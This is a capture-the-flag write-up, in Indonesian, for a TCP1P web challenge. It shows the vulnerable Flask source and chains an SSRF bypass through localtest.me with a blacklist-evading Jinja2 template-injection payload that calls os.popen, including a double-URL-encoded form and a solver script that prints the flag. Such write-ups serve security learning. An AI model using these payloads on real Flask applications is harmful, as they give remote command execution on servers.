# TCP1P CTF - WEB - Hacked Writeup

Pada Challenge kali ini diberikan sebuah aplikasi web, yang terdapat kerentanan SSRF dan di chain dengan SSTI untuk mendapatkan flag, untuk mengeksekusi SSRF caranya cukup mudah, namun untuk melakukan SSTI terdapat sangat banyak filter yang menghalangi sehingga cara untuk mendapatkan SSTI cukup tricky.

## Source Code
### App.py
```python
from flask import Flask, request, Response, jsonify, redirect, url_for, render_template_string, abort
from util import is_from_localhost, proxy_req
import random, os

app = Flask(__name__)

# I BLACKLIST EVERY CHAR :)

blacklist = ["debug", "args", "headers", "cookies", "environ", "values", "query",
    "data", "form", "os", "system", "popen", "subprocess", "globals", "locals",
    "self", "lipsum", "cycler", "joiner", "namespace", "init", "join", "decode",
    "module", "config", "builtins", "import", "application", "getitem", "read",
    "getitem", "mro", "endwith", " ", "'", '"', "_", "{{", "}}", "[", "]", "\\", "x"]

from flask import request, abort

def check_forbidden_input(func):
    def wrapper(*args, **kwargs):
        for header, value in request.headers.items():
            for forbidden_str in blacklist:
                if forbidden_str in value:
                    abort(400, f"Forbidden: '{forbidden_str}' not allowed in {header} header")

        for key, value in request.args.items():
            for forbidden_str in blacklist:
                if forbidden_str in value:
                    abort(400, f"Forbidden: '{forbidden_str}' not allowed in URL parameter '{key}'")

        try:
            if request.is_json:
                json_data = request.get_json()
                if json_data:
                    for key, value in json_data.items():
                        for forbidden_str in blacklist:
                            if forbidden_str in value:
                                abort(400, f"Forbidden: '{forbidden_str}' not allowed in JSON request body key '{key}'")
            else:
                body = request.get_data(as_text=True)
                for forbidden_str in blacklist:
                    if forbidden_str in body:
                        abort(400, f"Forbidden: '{forbidden_str}' not allowed in request body")
        except Exception as e:
            pass

        # Call the original function if checks pass
        return func(*args, **kwargs)
    return wrapper

@app.route('/', methods=['GET'])
@check_forbidden_input
def proxy():
    url = request.args.get('url')

    list_endpoints = [
        '/about/',
        '/portfolio/',
    ]

    if not url:
        endpoint = random.choice(list_endpoints)
        # Construct the URL with query parameter
        return redirect(f'/?url={endpoint}')
    
    target_url = "http://daffa.info" + url

    if target_url.startswith("http://daffa.info") and any(target_url.endswith(endpoint) for endpoint in list_endpoints):
        response, headers = proxy_req(target_url)

        return Response(response.content, response.status_code, headers.items())
    else:
        abort(403)

@app.route('/secret', methods=['GET', 'POST'])
@is_from_localhost
def dev_secret():
    admin = "daffainfo"
    css_url = url_for('static', filename='css/main.css')

    if request.args.get('admin') is not None:
        admin = request.args.get('admin')

    if not admin:
        abort(403)

    template = '''<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Admin Notes Preview</title>
            <link rel="stylesheet" href="{}">
        </head>
        <body>
            <h1>NOTES!! ONLY ADMIN CAN ACCESS THIS AREA!</h1>
            <form action="" method="GET">
                <label for="admin">Admin:</label>
                <input type="text" id="admin" name="admin" required>
                <br>
                <input type="submit" value="Preview!">
            </form>
            <p>Admin: {}<span id="adminName"></span></p>
        </body>
        </html>'''.format(css_url, admin)
    return render_template_string(template)

app.run(host='0.0.0.0', port=1337)
```

### util.py
```python
from flask import request, abort
import functools, requests
from urllib.parse import urlparse

RESTRICTED_URLS = ['localhost', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

def is_safe_url(url):
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    if not hostname:
        return False
    for restricted_url in RESTRICTED_URLS:
        if restricted_url in hostname:
            return False
    return True

def is_from_localhost(func):
    @functools.wraps(func)
    def check_ip(*args, **kwargs):
        if request.remote_addr != '127.0.0.1':
            return abort(403)
        return func(*args, **kwargs)
    return check_ip

def proxy_req(url):
    method = request.method
    headers =  {
        key: value for key, value in request.headers if key.lower() in ['x-csrf-token', 'cookie', 'referer']
    }
    data = request.get_data()

    response = requests.request(
        method,
        url,
        headers=headers,
        data=data,
        verify=False
    )

    if not is_safe_url(url) or not is_safe_url(response.url):
        return abort(403)
    
    return response, headers
```

## Gather Information

berdasarkan kode diatas, ketika kita memasukan parameter `/?url=/about/` maka web akan melakukan search dengan domain `http://daffa.info/about/`, ini bisa kita manfaatkan untuk melakukan SSRF, berikut payloadnya

### SSRF Payload
#### Parameter
```bash
/?url=@localtest.me/secret?admin=/about/
```
dengan memasukan payload diatas, kita bisa melakukan bypass yang mana hanya localhost yang bisa mengakses endpoint `secret`

Setelah masuk ke endpoint secret, disini kesenangan dimulai, kita harus mencari cara untuk melakukan SSTI dengan banyaknya blacklist yang ada. kita bisa memasukan SSTI pada parameter admin.

### SSTI Payload
#### blacklist
```python
blacklist = ["debug", "args", "headers", "cookies", "environ", "values", "query",
    "data", "form", "os", "system", "popen", "subprocess", "globals", "locals",
    "self", "lipsum", "cycler", "joiner", "namespace", "init", "join", "decode",
    "module", "config", "builtins", "import", "application", "getitem", "read",
    "getitem", "mro", "endwith", " ", "'", '"', "_", "{{", "}}", "[", "]", "\\", "x"]
```
#### RCE Payload
```python
{%with a=request|attr("appli"+"cation")|attr("\u005f\u005fglo"+"bals\u005f\u005f")|attr("\u005f\u005fget"+"item\u005f\u005f")("\u005f\u005fbuil"+"tins\u005f\u005f")|attr("\u005f\u005fgeti"+"tem\u005f\u005f")("\u005f\u005fimp"+"ort\u005f\u005f")("o"+"s")|attr("po"+"pen")("cat${IFS}/")|attr("re"+"ad")()%}{%print(a)%}{%endwith%}
```
Payload RCE diatas sudah dimodifikasi dengan metode bypass blacklist yang ada, namun masih terdapat beberapa karakter blacklist seperti `"`, sehingga payload masih belum bisa bekerja, langkah selanjutnya adalah melakukan url encode 2 kali terhadap payload diatas

#### RCE Payload with double url encode
```python
%257B%2525with%2520a%253Drequest%257Cattr%2528%2522appli%2522%252B%2522cation%2522%2529%257Cattr%2528%2522%255Cu005f%255Cu005fglo%2522%252B%2522bals%255Cu005f%255Cu005f%2522%2529%257Cattr%2528%2522%255Cu005f%255Cu005fget%2522%252B%2522item%255Cu005f%255Cu005f%2522%2529%2528%2522%255Cu005f%255Cu005fbuil%2522%252B%2522tins%255Cu005f%255Cu005f%2522%2529%257Cattr%2528%2522%255Cu005f%255Cu005fgeti%2522%252B%2522tem%255Cu005f%255Cu005f%2522%2529%2528%2522%255Cu005f%255Cu005fimp%2522%252B%2522ort%255Cu005f%255Cu005f%2522%2529%2528%2522o%2522%252B%2522s%2522%2529%257Cattr%2528%2522po%2522%252B%2522pen%2522%2529%2528%2522cat%2524%257BIFS%257D%252F%2522%2529%257Cattr%2528%2522re%2522%252B%2522ad%2522%2529%2528%2529%2525%257D%257B%2525print%2528a%2529%2525%257D%257B%2525endwith%2525%257D
```

## Automation Solver Code
```python
import requests
from bs4 import BeautifulSoup
url = 'http://127.0.0.1:23678/'
# url = 'http://ctf.tcp1p.team:10012'
headers = {
    'Accept-Language': 'en-US',
    'Upgrade-Insecure-Requests': '1',
    'Connection': 'keep-alive',
    'Accept-Encoding': 'identity',
    'x-csrf-token': 'sad'
}
ssti = '{%with a=request|attr("appli"+"cation")|attr("\u005f\u005fglo"+"bals\u005f\u005f")|attr("\u005f\u005fget"+"item\u005f\u005f")("\u005f\u005fbuil"+"tins\u005f\u005f")|attr("\u005f\u005fgeti"+"tem\u005f\u005f")("\u005f\u005fimp"+"ort\u005f\u005f")("o"+"s")|attr("po"+"pen")("cat${IFS}/")|attr("re"+"ad")()%}{%print(a)%}{%endwith%}'
response = requests.get(url + f'/?url=@localtest.me:1337/secret?admin={ssti}/about/', headers=headers)
print(response.text)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, 'html.parser')

    title = soup.title.string if soup.title else 'No Title Found'
    print(f"Title: {title}")

    body_text = soup.body.get_text(separator='\n', strip=True) if soup.body else 'No Body Found'
    print("\nBody Text:\n")
    print(body_text)
else:
    print(f"Error: {response.status_code}")

# Admin: TCP1P{Ch41n1ng_SsRF_pLu5_5St1_ba83f3ff121ba83f3ff121}/about/
```